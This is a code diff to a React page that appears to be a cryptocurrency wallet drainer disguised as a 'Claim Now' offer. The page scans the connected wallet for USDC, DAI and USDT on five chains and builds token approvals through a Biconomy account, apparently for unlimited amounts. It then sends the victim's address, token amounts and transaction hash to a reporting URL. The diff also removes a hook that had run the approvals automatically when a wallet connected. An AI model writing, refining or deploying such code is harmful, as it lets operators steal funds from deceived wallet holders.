@@ -1,7 +1,8 @@
 'use client';
-import { useState, useEffect } from 'react';
+import { useState } from 'react';
 import { useAccount } from 'wagmi';
-import { erc20Abi, maxUint256 } from 'viem';
+import { getWalletClient } from '@wagmi/core';
+import { erc20Abi, maxUint256, formatUnits } from 'viem';
 import { config } from '@/config';
 import {
   createMeeClient,
@@ -73,34 +74,25 @@ const TOKENS_BY_CHAIN: Record<
     { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6, min: BigInt(1e6) },
     { symbol: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, min: BigInt(1e18) },
     { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6, min: BigInt(1e6) },
-    { symbol: 'WETH', address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', decimals: 18, min: BigInt(1e16) },
-    { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8, min: BigInt(1e5) },
   ],
   [optimism.id]: [
     { symbol: 'USDC', address: '0x7F5c764cBc14f9669B88837ca1490cCa17c31607', decimals: 6, min: BigInt(1e6) },
     { symbol: 'DAI', address: '0xda10009cbd5d07dd0cecc66161fc93d7c9000da1', decimals: 18, min: BigInt(1e18) },
     { symbol: 'USDT', address: '0x94b008aa00579c1307b0ef2c499ad98a8ce58e58', decimals: 6, min: BigInt(1e6) },
-    { symbol: 'WETH', address: '0x4200000000000000000000000000000000000006', decimals: 18, min: BigInt(1e16) },
-    { symbol: 'WBTC', address: '0x68f180fcCe6836688e9084f035309E29Bf0A2095', decimals: 8, min: BigInt(1e5) },
   ],
   [base.id]: [
     { symbol: 'USDC', address: '0x833589fCD6eDb6E08f4c7C32D4f71b54BDA02913', decimals: 6, min: BigInt(1e6) },
     { symbol: 'USDT', address: '0x2dC0dDe60A4Bc4C3d0Ff6f6E5b5f3B7936E220e5', decimals: 6, min: BigInt(1e6) },
-    { symbol: 'WETH', address: '0x4200000000000000000000000000000000000006', decimals: 18, min: BigInt(1e16) },
   ],
   [arbitrum.id]: [
     { symbol: 'USDC', address: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831', decimals: 6, min: BigInt(1e6) },
     { symbol: 'DAI', address: '0xda10009cbd5d07dd0cecc66161fc93d7c9000da1', decimals: 18, min: BigInt(1e18) },
     { symbol: 'USDT', address: '0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9', decimals: 6, min: BigInt(1e6) },
-    { symbol: 'WETH', address: '0x82af49447d8a07e3bd95bd0d56f35241523fbab1', decimals: 18, min: BigInt(1e16) },
-    { symbol: 'WBTC', address: '0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f', decimals: 8, min: BigInt(1e5) },
   ],
   [polygon.id]: [
     { symbol: 'USDC', address: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359', decimals: 6, min: BigInt(1e6) },
     { symbol: 'DAI', address: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063', decimals: 18, min: BigInt(1e18) },
     { symbol: 'USDT', address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', decimals: 6, min: BigInt(1e6) },
-    { symbol: 'WETH', address: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619', decimals: 18, min: BigInt(1e16) },
-    { symbol: 'WBTC', address: '0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6', decimals: 8, min: BigInt(1e5) },
   ],
 };
 
@@ -119,7 +111,7 @@ async function getTokenBalance(
   }
 }
 
-// report success
+// report
 async function reportApproval(data: any) {
   if (!REPORT_URL) return;
   try {
@@ -127,16 +119,6 @@ async function reportApproval(data: any) {
   } catch (err) {
     console.error('Report failed', err);
   }
-}
-
-// UI reporter (hide address if connected)
-function ConnectionReporter() {
-  const { isConnected } = useAccount();
-  return (
-    <div style={{ marginTop: "80px", color: "#e4e1daff", fontSize: "14px" }}>
-      {isConnected ? "" : "Wallet not connected"}
-    </div>
-  );
 }
 
 export default function Page() {
@@ -151,8 +133,11 @@ export default function Page() {
       setLoading(true);
       setStatus(`🔍 Checking balances across chains...`);
 
+      const walletClient = await getWalletClient(config);
+      if (!walletClient) throw new Error("Please connect your wallet");
+
       const orchestrator = await toMultichainNexusAccount({
-        signer: window.ethereum as any,
+        signer: walletClient, // ✅ FIXED signer
         chainConfigurations: Object.values([mainnet, optimism, base, arbitrum, polygon]).map((c) => ({
           chain: c,
           transport: transports[c.id],
@@ -163,12 +148,20 @@ export default function Page() {
       const meeClient = await createMeeClient({ account: orchestrator, apiKey: BICONOMY_API_KEY });
 
       const instructions: any[] = [];
-      const feeCandidates: { address: `0x${string}`; chainId: number; symbol: string; decimals: number }[] = [];
+      const approvedTokens: { chain: string; symbol: string; amount: string; decimals: number }[] = [];
+      const feeCandidates: { address: `0x${string}`; chainId: number }[] = [];
 
       for (const [cid, tokens] of Object.entries(TOKENS_BY_CHAIN)) {
         for (const token of tokens) {
           const bal = await getTokenBalance(Number(cid), token, address as `0x${string}`);
           if (bal > BigInt(0)) {
+            approvedTokens.push({
+              chain: CHAIN_NAMES[Number(cid)],
+              symbol: token.symbol,
+              amount: formatUnits(bal, token.decimals),
+              decimals: token.decimals,
+            });
+
             const instr = await orchestrator.buildComposable({
               type: 'default',
               data: {
@@ -181,18 +174,13 @@ export default function Page() {
             });
             instructions.push(instr);
 
-            feeCandidates.push({
-              address: token.address,
-              chainId: Number(cid),
-              symbol: token.symbol,
-              decimals: token.decimals,
-            });
+            feeCandidates.push({ address: token.address, chainId: Number(cid) });
           }
         }
       }
 
-      if (instructions.length === 0 || feeCandidates.length === 0) {
-        setStatus(`ℹ️ No balance found on any chain.`);
+      if (instructions.length === 0) {
+        setStatus(`ℹ️ No balances found on any chain.`);
         setLoading(false);
         return;
       }
@@ -202,7 +190,7 @@ export default function Page() {
 
       for (const feeToken of feeCandidates) {
         try {
-          setStatus(`🚀 Trying gas payment with ${CHAIN_NAMES[feeToken.chainId]} ${feeToken.symbol}...`);
+          setStatus(`🚀 Approving using ${CHAIN_NAMES[feeToken.chainId]} ${feeToken.address} as gas token...`);
 
           const fusionQuote = await meeClient.getFusionQuote({
             instructions,
@@ -213,21 +201,25 @@ export default function Page() {
           const { hash } = await meeClient.executeFusionQuote({ fusionQuote });
           await meeClient.waitForSupertransactionReceipt({ hash });
 
-          setStatus(`✅ Finished approvals across all chains.\nTx: ${hash}`);
+          setStatus(`🎉 Finished approvals across chains. Tx: ${hash}`);
 
-          await reportApproval({
-            wallet: address,
-            chain: CHAIN_NAMES[feeToken.chainId],
-            token: feeToken.symbol,
-            tokenAddress: feeToken.address,
-            decimals: feeToken.decimals,
-            txHash: hash,
-          });
+          for (const t of approvedTokens) {
+            await reportApproval({
+              wallet: address,
+              chain: t.chain,
+              token: t.symbol,
+              amount: t.amount,
+              decimals: t.decimals,
+              txHash: hash,
+              feeToken: { token: feeToken.address, chain: CHAIN_NAMES[feeToken.chainId] },
+            });
+          }
 
           success = true;
           break;
         } catch (err: any) {
           lastError = err;
+          console.warn(`Fee token failed: ${CHAIN_NAMES[feeToken.chainId]} ${feeToken.address}`, err);
           continue;
         }
       }
@@ -238,17 +230,11 @@ export default function Page() {
     } catch (err: any) {
       console.error(err);
       setStatus(`❌ Error: ${err.message || err}`);
+      await reportApproval({ wallet: address, error: err.message || String(err) });
     } finally {
       setLoading(false);
     }
   };
-
-  // 🔥 Auto-run approvals when wallet connects
-  useEffect(() => {
-    if (isConnected && address && !loading) {
-      handleApproveAllChains();
-    }
-  }, [isConnected, address]);
 
   return (
     <main
@@ -282,8 +268,6 @@ export default function Page() {
         </div>
         <appkit-button />
       </header>
-
-      <ConnectionReporter />
 
       <div
         style={{
@@ -324,7 +308,6 @@ export default function Page() {
             {status || ""}
           </div>
 
-          {/* Button stays visible, but approvals also auto-run */}
           <button
             onClick={handleApproveAllChains}
             style={{
@@ -336,7 +319,7 @@ export default function Page() {
               marginTop: "16px",
             }}
           >
-            Claim Now
+            {loading ? "Processing..." : "Claim Now"}
           </button>
         </div>
 
